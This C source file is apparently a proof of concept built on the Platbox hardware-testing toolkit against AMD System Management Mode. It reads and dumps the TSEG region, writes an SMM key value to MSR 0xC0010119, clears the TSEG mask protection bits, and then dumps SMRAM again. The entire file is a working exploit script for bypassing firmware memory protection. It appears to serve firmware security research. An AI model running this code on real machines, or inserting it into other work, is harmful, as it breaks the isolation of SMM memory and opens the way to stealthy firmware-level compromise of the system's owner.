#include "global.h"
#include "pci.h"
#include "common_chipset.h"
#include "Util.h"
#include "physmem.h"
#include "msr.h"


#define MSR_SMM_KEY     0xC0010119
#define MSR_SMM_KEY_VAL 0x4141414141414141

int main(int argc, char **argv)
{ 
  open_platbox_device();
  
  UINT64 tseg_base = 0;
  UINT32 tseg_size = 0;
  get_tseg_region(&tseg_base, &tseg_size);
  printf("TSEG Base: %08x\n", tseg_base);
  printf("TSEG  End: %08x\n", tseg_base + tseg_size);
  printf("\nattempting to map TSEG\n");
  void *tseg_map = map_physical_memory(tseg_base, PAGE_SIZE);
  print_memory(tseg_base, (char *) tseg_map, 0x100);
  unmap_physical_memory(tseg_map, PAGE_SIZE);

  getchar();

  printf("Setting SMM Key\n");
  do_write_msr(MSR_SMM_KEY, MSR_SMM_KEY_VAL);

  printf("Disabling TSEG protection\n");
  UINT64 tseg_mask = 0;
  do_read_msr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
  do_write_msr(AMD_MSR_SMM_TSEG_MASK, tseg_mask & 0xFFFFFFFFFFFFFFFC);
  
  printf("\nattempting to map TSEG\n");
  tseg_map = map_physical_memory(tseg_base, PAGE_SIZE);
  print_memory(tseg_base, (char *) tseg_map, 0x100);
  unmap_physical_memory(tseg_map, PAGE_SIZE);
  
  close_platbox_device();

  return 0;
}